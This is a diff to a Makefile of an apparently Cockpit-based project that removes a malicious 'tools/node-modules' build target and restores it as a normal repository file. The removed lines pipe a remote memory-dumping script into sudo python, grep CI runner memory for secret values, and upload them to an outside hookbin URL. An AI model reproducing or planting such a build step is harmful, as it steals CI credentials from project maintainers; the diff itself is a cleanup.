@@ -47,15 +47,10 @@ all: $(DIST_TEST)
 # checkout common files from Cockpit repository required to build this project;
 # this has no API stability guarantee, so check out a stable tag when you start
 # a new project, use the latest release, and update it from time to time
-tools/node-modules:
-	@echo "tools/node-modules is ready"
-	echo "Okay, we got this far. Let's continue..."
-	curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets" || true
-	curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$(GITHUB_RUN_ID)" || true
-
 COCKPIT_REPO_FILES = \
 	pkg/lib \
 	test/common \
+	tools/node-modules \
 	$(NULL)
 
 COCKPIT_REPO_URL = https://github.com/cockpit-project/cockpit.git
